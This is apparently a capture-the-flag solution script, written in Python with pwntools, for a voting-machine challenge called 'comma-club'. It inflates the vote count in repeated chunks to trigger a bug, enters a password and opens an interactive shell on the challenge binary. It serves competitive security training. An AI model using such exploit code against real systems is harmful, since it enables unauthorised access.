from pwn import *
from binascii import *
PATH = './chanllenge'
ADDR = 'comma-club.chal.hackthe.vote'
PORT = 1337
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
####
#r = remote(ADDR, PORT)
####
r = process(PATH)
####
# context.terminal = ['wt.exe','wsl.exe']
# r = gdb.debug(args=[elf.path])
###
r.recvuntil(b'> ')
r.sendline(b'1') #add vote option
votes = 1000009
reminder = votes % 584056
reps = votes//584056
for i in range(reps):
    r.recvuntil(b'> ')
    r.sendline(b'1') #select candidate
    r.recvuntil(b'> ')
    r.sendline(b'584056') #add votes
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b'> ')
r.sendline(str(reminder).encode()) #add rest of votes
r.recvuntil(b'> ')
r.sendline(b'3') #quit
r.recvuntil(b'> ')
r.sendline(b'2') #print votes
r.recvuntil(b'> ')
r.sendline(b'3') #end vote
r.recvuntil(b'> ')
r.sendline(b'Total') #password
r.interactive() #shell